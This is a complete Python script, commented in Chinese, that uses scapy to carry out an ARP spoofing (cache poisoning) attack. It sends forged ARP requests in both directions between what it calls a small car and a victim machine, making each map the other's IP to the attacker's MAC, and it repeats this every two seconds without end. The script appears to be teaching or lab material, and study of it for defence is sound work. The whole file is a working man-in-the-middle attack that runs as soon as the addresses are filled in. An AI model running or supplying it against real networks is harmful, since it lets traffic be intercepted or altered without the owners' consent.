#!/usr/bin/python                            # 指定解释器路径
from scapy.all import *                      # 导入 scapy 中所有模块，用于构造和发送网络包
from time import *                           # 导入 time 模块中所有函数，用于延时操作

IP_A    = "192.168.1.112"                    # 小车的 IP 地址（需要换成实际小车的 IP）
IP_B    = "192.168.1.199"                    # 被攻击机的 IP 地址（需要换成实际被攻击机的 IP）
MAC_M   = "00:0c:29:07:36:d1"                # 攻击机的 MAC 地址（需要换成实际攻击机的 MAC）

print("SENDING SPOOFED ARP REQUEST......")  # 输出提示信息，表示开始发送伪造的 ARP 请求

ether = Ether()                             # 创建一个以太网帧对象
ether.dst = "ff:ff:ff:ff:ff:ff"             # 设置以太网帧目标地址为广播地址，所有设备都能接收到
ether.src = MAC_M                           # 设置以太网帧的源 MAC 地址为攻击机的 MAC 地址

arp = ARP()                                 # 创建第一个 ARP 包对象
arp.psrc  = IP_B                            # 设置 ARP 包的源 IP 地址为被攻击机 IP，伪装成被攻击机
arp.hwsrc = MAC_M                           # 设置 ARP 包的源 MAC 地址为攻击机 MAC
arp.pdst  = IP_A                            # 设置 ARP 包的目标 IP 地址为小车 IP
arp.op = 1                                  # 设置 ARP 操作码 1，表示 ARP 请求
frame1 = ether/arp                          # 将以太网帧和ARP包合并，构造完整的伪造数据包

arp2 = ARP()                                # 创建第二个 ARP 包对象
arp2.psrc = IP_A                            # 设置第二个 ARP 包源 IP 为小车 IP，伪装成小车
arp2.hwsrc = MAC_M                          # 设置源 MAC 同样为攻击机的 MAC
arp2.pdst = IP_B                            # 设置目标 IP 为被攻击机
arp2.op = 1                                 # 设置 ARP 操作码 1，表示 ARP 请求
frame2 = ether/arp2                         # 合并成第二个完整数据包

while 1:
    sendp(frame1)                          # 循环中持续发送第一个伪造的 ARP 请求包
    sendp(frame2)                          # 同时持续发送第二个伪造的 ARP 请求包
    sleep(2)                               # 发送完后暂停2秒，再继续发送